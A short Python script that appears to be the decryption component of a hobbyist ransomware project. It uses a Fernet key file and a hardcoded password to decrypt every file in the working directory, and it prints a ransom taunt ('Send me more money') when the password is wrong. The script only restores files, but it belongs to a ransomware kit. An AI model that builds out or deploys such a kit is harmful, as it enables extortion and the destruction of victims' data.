import os
from cryptography.fernet import Fernet
from text import decrypted

secret_key = "coffee"

def get_files():
    exclude_files = ["encrypt.py", "thekey.key", "decrypt.py", "text.py"]
    files = [file for file in os.listdir() if file not in exclude_files and os.path.isfile(file)]
    return files

def get_key():
	with open("thekey.key", "rb") as thekey:
		key = thekey.read()
	
	if len(key) == 0:
		raise Exception("No key found")
	
	return key

def decrypt_files(files, key):	
	user = input("Enter the password: ")
	if user != secret_key:
		raise Exception("Wrong password. Send me more money.")

	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		decrypted_content = Fernet(key).decrypt(content)
		with open(file, "wb") as thefile:
			thefile.write(decrypted_content)

def main():
	try:
		files = get_files()
		key = get_key()
		decrypt_files(files, key)
		print(decrypted)
	
	except Exception as e:
		print(f"A problem occured: {e}.")

if __name__ == "__main__":
	main()
